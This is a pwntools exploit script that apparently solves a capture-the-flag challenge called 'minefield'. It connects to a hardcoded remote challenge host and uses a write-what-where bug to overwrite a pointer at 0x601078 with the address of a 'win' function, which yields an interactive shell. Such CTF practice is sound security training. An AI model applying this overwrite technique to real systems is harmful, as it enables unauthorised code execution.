#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 4444 ./minefield
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./minefield')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '165.227.236.40'
port = int(args.PORT or 30546)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0000000000400a89
b *0x0000000000400acc
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
win = 0x000000000040096b

io.sendlineafter("> ","2")

p =str(0x601078)
p = p.ljust(9,"\x00")
io.sendafter("mine: ",p)
p =str(0x000000000040096b)
p = p.ljust(9,"\x00")
io.sendafter("plant: ",p)


io.interactive()
